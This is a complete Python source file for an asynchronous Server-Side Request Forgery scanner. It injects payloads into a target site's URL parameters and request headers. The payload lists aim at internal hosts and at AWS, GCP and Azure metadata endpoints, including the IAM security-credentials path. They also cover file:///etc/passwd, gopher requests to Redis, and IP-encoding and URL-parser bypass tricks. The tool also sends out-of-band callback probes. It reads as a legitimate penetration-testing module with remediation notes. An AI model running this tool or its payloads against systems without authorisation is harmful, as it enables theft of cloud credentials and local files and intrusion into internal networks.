#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) testing module.

Usage:
    python ssrf_tester.py --target https://example.com/fetch?url=test --output results/
"""

import argparse
import asyncio
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse, quote

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("ssrf_tester")


@dataclass
class SSRFVulnerability:
    """Represents a discovered SSRF vulnerability."""

    url: str
    parameter: str
    method: str
    ssrf_type: str  # internal, cloud_metadata, protocol, blind
    payload: str
    evidence: str
    target_accessed: str = ""
    confidence: str = "medium"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "ssrf_type": self.ssrf_type,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "target_accessed": self.target_accessed,
            "confidence": self.confidence,
        }


class SSRFTester:
    """
    Server-Side Request Forgery vulnerability tester.

    Features:
    - Internal network access
    - Cloud metadata endpoints (AWS, GCP, Azure)
    - Protocol handlers (file://, gopher://, etc.)
    - Bypass techniques
    - Blind SSRF detection
    - Header-based SSRF testing (X-Forwarded-For, Host, etc.)
    """

    # SSRF-prone HTTP headers for header-based testing
    SSRF_HEADERS = [
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Forwarded-Server",
        "X-Real-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "X-Client-IP",
        "True-Client-IP",
        "Client-IP",
        "X-Originating-IP",
        "CF-Connecting-IP",
        "Forwarded",
        "X-Host",
        "Host",
        "X-Original-URL",
        "X-Rewrite-URL",
    ]

    # Header payloads for SSRF testing
    HEADER_SSRF_PAYLOADS = [
        # Localhost variants
        ("127.0.0.1", "localhost"),
        ("localhost", "localhost"),
        ("0.0.0.0", "localhost"),
        ("[::1]", "ipv6_localhost"),
        ("127.1", "short_localhost"),
        # Internal networks
        ("10.0.0.1", "internal_10"),
        ("172.16.0.1", "internal_172"),
        ("192.168.1.1", "internal_192"),
        # Cloud metadata
        ("169.254.169.254", "aws_metadata"),
        ("metadata.google.internal", "gcp_metadata"),
        # Bypass techniques
        ("127.0.0.1:80", "localhost_port"),
        ("127.0.0.1:443", "localhost_https"),
        ("127.0.0.1:8080", "localhost_alt"),
        ("2130706433", "decimal_localhost"),  # 127.0.0.1 in decimal
        ("0x7f000001", "hex_localhost"),
        ("017700000001", "octal_localhost"),
    ]

    # Internal/localhost targets
    INTERNAL_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3000",
        "http://192.168.0.1",
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
    ]

    # Cloud metadata endpoints
    CLOUD_METADATA = [
        # AWS
        ("http://169.254.169.254/latest/meta-data/", "aws", r"ami-id|instance-id|hostname"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws", r"AccessKeyId|SecretAccessKey"),
        ("http://169.254.169.254/latest/user-data/", "aws", r".+"),

        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/", "gcp", r"attributes|instance|project"),
        ("http://169.254.169.254/computeMetadata/v1/", "gcp", r"attributes|instance"),

        # Azure
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure", r"compute|network"),

        # DigitalOcean
        ("http://169.254.169.254/metadata/v1/", "digitalocean", r"droplet|hostname"),

        # Alibaba Cloud
        ("http://100.100.100.200/latest/meta-data/", "alibaba", r"instance-id|hostname"),
    ]

    # Protocol-based payloads
    PROTOCOL_PAYLOADS = [
        ("file:///etc/passwd", "file", r"root:.*:0:0"),
        ("file:///etc/hosts", "file", r"localhost"),
        ("file:///c:/windows/win.ini", "file", r"\[fonts\]"),
        ("dict://127.0.0.1:11211/info", "dict", r"STAT|VERSION"),
        ("gopher://127.0.0.1:6379/_INFO", "gopher", r"redis_version"),
    ]

    # Bypass techniques
    BYPASS_PAYLOADS = [
        # IP obfuscation
        ("http://2130706433", "decimal IP (127.0.0.1)"),  # 127.0.0.1 in decimal
        ("http://0x7f000001", "hex IP (127.0.0.1)"),
        ("http://017700000001", "octal IP (127.0.0.1)"),
        ("http://127.1", "short IP"),
        ("http://127.0.1", "short IP"),

        # DNS rebinding style
        ("http://localtest.me", "DNS pointing to 127.0.0.1"),
        ("http://spoofed.burpcollaborator.net", "DNS rebinding"),

        # URL encoding
        ("http://%31%32%37%2e%30%2e%30%2e%31", "URL encoded 127.0.0.1"),
        ("http://127.0.0.1%00.evil.com", "null byte injection"),
        ("http://127.0.0.1%2523", "double encoding"),

        # Case variations
        ("http://LOCALHOST", "uppercase localhost"),
        ("http://LoCalHoSt", "mixed case"),

        # IPv6
        ("http://[0:0:0:0:0:ffff:127.0.0.1]", "IPv6 mapped IPv4"),
        ("http://[::127.0.0.1]", "IPv6 compressed"),

        # URL parser confusion
        ("http://evil.com@127.0.0.1", "@ symbol"),
        ("http://127.0.0.1#@evil.com", "# fragment"),
        ("http://127.0.0.1:80#@evil.com", "port and fragment"),
    ]

    # Common URL parameter names that might be vulnerable
    URL_PARAMS = [
        "url", "uri", "path", "dest", "destination",
        "redirect", "return", "next", "target", "rurl",
        "link", "src", "source", "file", "document",
        "page", "view", "site", "callback", "redir",
        "redirect_uri", "return_url", "returnUrl",
        "feed", "host", "proxy", "proxyUrl",
        "img", "image", "load", "data", "reference",
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        threads: int = 10,
        test_params: Optional[List[str]] = None,
        oob_server: Optional[str] = None,
        methods: Optional[List[str]] = None,
        verbose: bool = False,
        header_ssrf: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.test_params = test_params
        self.oob_server = oob_server
        self.methods = methods or ["GET"]
        self.verbose = verbose
        self.header_ssrf = header_ssrf

        self.vulnerabilities: List[SSRFVulnerability] = []
        self.baseline_response: Optional[HTTPResponse] = None
        self.header_ssrf_results: List[Dict] = []

        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run SSRF tests and return results."""
        result = ScanResult(
            tool="ssrf_tester",
            target=self.target,
            config={
                "timeout": self.timeout,
                "threads": self.threads,
                "methods": self.methods,
                "oob_server": self.oob_server,
            },
        )

        logger.info(f"Starting SSRF testing for: {self.target}")

        try:
            # Detect URL parameters
            test_params = self.test_params or self._detect_url_params()

            if not test_params:
                result.add_error("No URL parameters found. Use --params to specify.")
                logger.warning("No URL parameters detected")
                result.finalize()
                return result

            logger.info(f"Testing parameters: {test_params}")

            # Get baseline
            await self._get_baseline()

            for param in test_params:
                # Test internal network
                await self._test_internal(param)

                # Test cloud metadata
                await self._test_cloud_metadata(param)

                # Test protocol handlers
                await self._test_protocols(param)

                # Test bypass techniques
                await self._test_bypasses(param)

                # Test blind SSRF
                if self.oob_server:
                    await self._test_blind_ssrf(param)

            # Test header-based SSRF
            if self.header_ssrf:
                await self._test_header_ssrf()

            # Statistics
            result.stats = {
                "parameters_tested": len(test_params),
                "vulnerabilities_found": len(self.vulnerabilities),
                "header_ssrf_findings": len(self.header_ssrf_results),
                "by_type": self._count_by_type(),
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.CRITICAL if vuln.ssrf_type == "cloud_metadata" else Severity.HIGH

                result.add_finding(Finding(
                    title=f"SSRF ({vuln.ssrf_type}): {vuln.parameter}",
                    severity=severity,
                    description=f"Server-Side Request Forgery allowing access to {vuln.target_accessed or 'internal resources'}",
                    url=vuln.url,
                    parameter=vuln.parameter,
                    payload=vuln.payload,
                    evidence=vuln.evidence,
                    metadata={
                        "ssrf_type": vuln.ssrf_type,
                        "target_accessed": vuln.target_accessed,
                        "confidence": vuln.confidence,
                    },
                    cwe_id="CWE-918",
                    remediation="Validate and sanitize user-supplied URLs. Use allowlists for permitted domains. Block private IP ranges.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _get_baseline(self):
        """Get baseline response."""
        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            self.baseline_response = await client.get(self.target)

    def _detect_url_params(self) -> List[str]:
        """Detect URL parameters that might accept URLs."""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        detected = []
        for param in params.keys():
            if param.lower() in [p.lower() for p in self.URL_PARAMS]:
                detected.append(param)
            # Check if value looks like a URL
            value = params[param][0]
            if value.startswith(('http://', 'https://', '//')):
                if param not in detected:
                    detected.append(param)

        return detected

    async def _test_internal(self, param: str):
        """Test for internal network SSRF."""
        logger.info(f"Testing internal network SSRF for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for internal_url in self.INTERNAL_TARGETS:
                url = self._inject_payload(param, internal_url)

                try:
                    response = await client.get(url)

                    if self._is_ssrf_success(response, internal_url):
                        vuln = SSRFVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            ssrf_type="internal",
                            payload=internal_url,
                            evidence=response.body[:500],
                            target_accessed=internal_url,
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found internal SSRF: {param} -> {internal_url}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing {internal_url}: {e}")

    async def _test_cloud_metadata(self, param: str):
        """Test for cloud metadata SSRF."""
        logger.info(f"Testing cloud metadata SSRF for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for metadata_url, cloud, pattern in self.CLOUD_METADATA:
                url = self._inject_payload(param, metadata_url)

                # Some cloud providers require special headers
                headers = {}
                if cloud == "gcp":
                    headers["Metadata-Flavor"] = "Google"
                elif cloud == "azure":
                    headers["Metadata"] = "true"

                try:
                    response = await client.get(url, headers=headers)

                    if response.status == 200 and re.search(pattern, response.body, re.IGNORECASE):
                        vuln = SSRFVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            ssrf_type="cloud_metadata",
                            payload=metadata_url,
                            evidence=response.body[:500],
                            target_accessed=f"{cloud} metadata",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found cloud metadata SSRF: {param} -> {cloud}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing {metadata_url}: {e}")

    async def _test_protocols(self, param: str):
        """Test for protocol handler SSRF."""
        logger.info(f"Testing protocol handler SSRF for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for protocol_url, protocol, pattern in self.PROTOCOL_PAYLOADS:
                url = self._inject_payload(param, protocol_url)

                try:
                    response = await client.get(url)

                    if response.status == 200 and re.search(pattern, response.body, re.IGNORECASE):
                        vuln = SSRFVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            ssrf_type="protocol",
                            payload=protocol_url,
                            evidence=response.body[:500],
                            target_accessed=f"{protocol}:// handler",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found protocol SSRF: {param} -> {protocol}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing {protocol_url}: {e}")

    async def _test_bypasses(self, param: str):
        """Test SSRF bypass techniques."""
        logger.info(f"Testing SSRF bypasses for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for bypass_url, description in self.BYPASS_PAYLOADS:
                url = self._inject_payload(param, bypass_url)

                try:
                    response = await client.get(url)

                    if self._is_ssrf_success(response, "127.0.0.1"):
                        vuln = SSRFVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            ssrf_type="bypass",
                            payload=bypass_url,
                            evidence=f"Bypass via {description}",
                            target_accessed="localhost (via bypass)",
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found SSRF bypass: {param} -> {description}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing bypass {bypass_url}: {e}")

    async def _test_blind_ssrf(self, param: str):
        """Test for blind SSRF using OOB server."""
        if not self.oob_server:
            return

        logger.info(f"Testing blind SSRF for: {param}")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            url = self._inject_payload(param, self.oob_server)

            try:
                await client.get(url)

                # Note: Actual confirmation requires checking OOB server logs
                vuln = SSRFVulnerability(
                    url=self.target,
                    parameter=param,
                    method="GET",
                    ssrf_type="blind",
                    payload=self.oob_server,
                    evidence="Blind SSRF payload sent. Check OOB server for callbacks.",
                    target_accessed=self.oob_server,
                    confidence="low",
                )
                self.vulnerabilities.append(vuln)
                logger.info("Blind SSRF payload sent - check OOB server")

            except Exception as e:
                logger.debug(f"Error testing blind SSRF: {e}")

    async def _test_header_ssrf(self):
        """
        Test for SSRF via HTTP headers.

        This tests headers like X-Forwarded-For, X-Forwarded-Host, etc.
        that might cause the server to make requests to attacker-controlled destinations.
        """
        logger.info("Testing header-based SSRF...")

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            # First, get baseline response
            baseline = await client.get(self.target)
            baseline_status = baseline.status
            baseline_length = len(baseline.body)

            for header_name in self.SSRF_HEADERS:
                for payload, payload_type in self.HEADER_SSRF_PAYLOADS:
                    try:
                        # Test with the header
                        test_headers = {header_name: payload}
                        response = await client.get(self.target, headers=test_headers)

                        # Detect SSRF indicators
                        is_suspicious = self._detect_header_ssrf(
                            baseline_status, baseline_length, baseline.body,
                            response.status, len(response.body), response.body,
                            header_name, payload
                        )

                        if is_suspicious:
                            result = {
                                "header": header_name,
                                "payload": payload,
                                "payload_type": payload_type,
                                "baseline_status": baseline_status,
                                "baseline_length": baseline_length,
                                "response_status": response.status,
                                "response_length": len(response.body),
                                "evidence": is_suspicious,
                            }
                            self.header_ssrf_results.append(result)

                            vuln = SSRFVulnerability(
                                url=self.target,
                                parameter=f"Header: {header_name}",
                                method="GET",
                                ssrf_type="header_ssrf",
                                payload=f"{header_name}: {payload}",
                                evidence=f"Status: {baseline_status} -> {response.status}, "
                                         f"Length: {baseline_length} -> {len(response.body)}. "
                                         f"Indicator: {is_suspicious}",
                                target_accessed=payload_type,
                                confidence="medium" if "status_change" in is_suspicious else "low",
                            )
                            self.vulnerabilities.append(vuln)
                            logger.info(f"Potential header SSRF: {header_name}={payload} ({is_suspicious})")

                    except Exception as e:
                        logger.debug(f"Error testing header {header_name}={payload}: {e}")

            # Test OOB if server provided
            if self.oob_server:
                await self._test_header_ssrf_oob(client)

    async def _test_header_ssrf_oob(self, client: AsyncHTTPClient):
        """Test header-based SSRF with out-of-band callback server."""
        logger.info("Testing header-based SSRF with OOB callback...")

        for header_name in self.SSRF_HEADERS:
            try:
                # Include unique identifier in OOB URL for tracking
                oob_url = f"{self.oob_server}/ssrf-header-{header_name.lower().replace('-', '_')}"
                test_headers = {header_name: oob_url}

                await client.get(self.target, headers=test_headers)

                # Log for manual verification
                vuln = SSRFVulnerability(
                    url=self.target,
                    parameter=f"Header: {header_name}",
                    method="GET",
                    ssrf_type="header_ssrf_blind",
                    payload=f"{header_name}: {oob_url}",
                    evidence=f"Blind header SSRF payload sent. Check OOB server for: {oob_url}",
                    target_accessed=self.oob_server,
                    confidence="low",
                )
                self.vulnerabilities.append(vuln)

            except Exception as e:
                logger.debug(f"Error testing OOB header {header_name}: {e}")

    def _detect_header_ssrf(
        self,
        baseline_status: int,
        baseline_length: int,
        baseline_body: str,
        response_status: int,
        response_length: int,
        response_body: str,
        header_name: str,
        payload: str,
    ) -> Optional[str]:
        """
        Detect potential SSRF via response analysis.

        Returns indicator string if suspicious, None otherwise.
        """
        indicators = []

        # Status code changes indicating routing/proxy behavior
        ssrf_status_patterns = [
            # Backend errors suggesting internal request attempt
            (200, 502, "status_change_502_bad_gateway"),
            (200, 504, "status_change_504_gateway_timeout"),
            (200, 500, "status_change_500_internal_error"),
            (200, 403, "status_change_403_forbidden"),
            (200, 404, "status_change_404_not_found"),
            # Redirect behavior
            (200, 301, "status_change_301_redirect"),
            (200, 302, "status_change_302_redirect"),
            (200, 307, "status_change_307_redirect"),
        ]

        for base, resp, indicator in ssrf_status_patterns:
            if baseline_status == base and response_status == resp:
                indicators.append(indicator)

        # Significant length change (>20% difference)
        if baseline_length > 0:
            length_diff = abs(response_length - baseline_length) / baseline_length
            if length_diff > 0.2:
                indicators.append(f"length_change_{int(length_diff * 100)}%")

        # Content indicators suggesting internal access
        internal_indicators = [
            ("127.0.0.1", "localhost_in_response"),
            ("localhost", "localhost_in_response"),
            ("internal", "internal_keyword"),
            ("private", "private_keyword"),
            ("root:", "etc_passwd_leak"),
            ("metadata", "metadata_keyword"),
            ("instance-id", "cloud_metadata"),
            ("ami-id", "aws_metadata"),
            ("AccessDenied", "access_denied_error"),
            ("Connection refused", "connection_refused"),
            ("Connection timed out", "connection_timeout"),
        ]

        response_lower = response_body.lower()
        for keyword, indicator in internal_indicators:
            if keyword.lower() in response_lower and keyword.lower() not in baseline_body.lower():
                indicators.append(indicator)

        # Error messages indicating SSRF attempt processing
        error_patterns = [
            (r"could not connect", "connection_error"),
            (r"failed to fetch", "fetch_error"),
            (r"invalid host", "invalid_host_error"),
            (r"blocked", "blocked_error"),
            (r"not allowed", "not_allowed_error"),
        ]

        for pattern, indicator in error_patterns:
            if re.search(pattern, response_body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    indicators.append(indicator)

        return ", ".join(indicators) if indicators else None

    def _inject_payload(self, param: str, payload: str) -> str:
        """Inject payload into parameter."""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        params[param] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def _is_ssrf_success(self, response: HTTPResponse, target: str) -> bool:
        """Determine if SSRF was successful."""
        if response.status not in [200, 201, 202]:
            return False

        # Check for localhost indicators
        localhost_indicators = [
            "127.0.0.1",
            "localhost",
            "root:",  # /etc/passwd
            "DOCUMENT_ROOT",
            "Server:",
            "Apache",
            "nginx",
        ]

        body_lower = response.body.lower()
        for indicator in localhost_indicators:
            if indicator.lower() in body_lower:
                return True

        # Different response from baseline
        if self.baseline_response:
            if len(response.body) != len(self.baseline_response.body):
                if abs(len(response.body) - len(self.baseline_response.body)) > 100:
                    return True

        return False

    def _count_by_type(self) -> Dict[str, int]:
        """Count vulnerabilities by type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.ssrf_type] = counts.get(vuln.ssrf_type, 0) + 1
        return counts

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"ssrf_{self.target_domain}")

        vuln_path = self.output_dir / f"ssrf_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump(
                {
                    "target": self.target,
                    "timestamp": timestamp_now(),
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="Server-Side Request Forgery (SSRF) vulnerability tester"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL with URL parameter")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--params", help="Parameters to test (comma-separated)")
    parser.add_argument("--oob-server", help="OOB server URL for blind SSRF")
    parser.add_argument("--header-ssrf", action="store_true", help="Enable header-based SSRF testing")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    test_params = args.params.split(",") if args.params else None

    tester = SSRFTester(
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads,
        test_params=test_params,
        oob_server=args.oob_server,
        verbose=args.verbose,
        header_ssrf=args.header_ssrf,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"SSRF Testing Complete: {args.target}")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    print(f"By Type: {result.stats.get('by_type', {})}")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** SSRF VULNERABILITIES FOUND ***")
        for vuln in tester.vulnerabilities:
            print(f"  [{vuln.confidence.upper()}] {vuln.ssrf_type}: {vuln.parameter} -> {vuln.target_accessed}")


if __name__ == "__main__":
    asyncio.run(main())
